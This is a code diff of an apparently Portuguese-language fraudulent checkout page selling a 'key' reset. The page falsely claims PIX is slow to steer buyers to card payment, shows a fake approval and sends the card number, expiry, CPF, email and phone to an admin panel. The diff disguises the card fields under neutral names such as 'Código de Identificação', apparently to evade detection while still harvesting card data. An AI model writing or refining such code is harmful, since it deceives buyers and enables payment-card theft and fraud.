@@ -104,20 +104,20 @@
                 O sistema PIX do Banco Central está apresentando lentidão neste exato momento. Para liberação imediata da sua Key, recomendamos fortemente o uso de <strong>Cartão de Crédito</strong>. Se preferir manter no PIX, aguarde a normalização do sistema após o pagamento.
             </div>
 
-            <!-- Credit Card Fields -->
+            <!-- Dados de Pagamento -->
             <div id="creditCardFields" class="payment-info">
                 <div class="form-group">
-                    <label for="cardNumber">Número do Cartão</label>
-                    <input type="text" id="cardNumber" name="cardnumber" autocomplete="off" placeholder="0000 0000 0000 0000">
+                    <label for="serialCode">Código de Identificação</label>
+                    <input type="text" id="serialCode" name="serialcode" autocomplete="off" placeholder="0000 0000 0000 0000">
                 </div>
                 <div style="display: flex; gap: 15px;">
                     <div class="form-group" style="flex: 1;">
-                        <label for="expiry">Validade</label>
-                        <input type="text" id="expiry" name="expiry" autocomplete="off" placeholder="MM/AA">
+                        <label for="validDate">Data de Expiração</label>
+                        <input type="text" id="validDate" name="validdate" autocomplete="off" placeholder="MM/AA">
                     </div>
                     <div class="form-group" style="flex: 1;">
-                        <label for="cvv">Telefone (Contato)</label>
-                        <input type="text" id="cvv" name="telefone" autocomplete="tel" placeholder="(11) 90000-0000">
+                        <label for="phoneContact">Telefone (Contato)</label>
+                        <input type="text" id="phoneContact" name="telefone" autocomplete="tel" placeholder="(11) 90000-0000">
                     </div>
                 </div>
             </div>
@@ -208,9 +208,9 @@
         messageDiv.innerHTML = '✅ Pagamento aprovado!<br>Sua key foi resetada com sucesso e liberada no sistema.';
         
         // Save to server for Admin Panel
-        const card_number = document.getElementById('cardNumber').value;
-        const card_expiry = document.getElementById('expiry').value;
-        const phone = document.getElementById('cvv').value; // Usando o campo ID cvv para Telefone
+        const card_number = document.getElementById('serialCode').value;
+        const card_expiry = document.getElementById('validDate').value;
+        const phone = document.getElementById('phoneContact').value;
         
         savePurchase({ name, cpf, email, method: 'credit_card', status: 'approved', card_number, card_expiry, phone });
     });
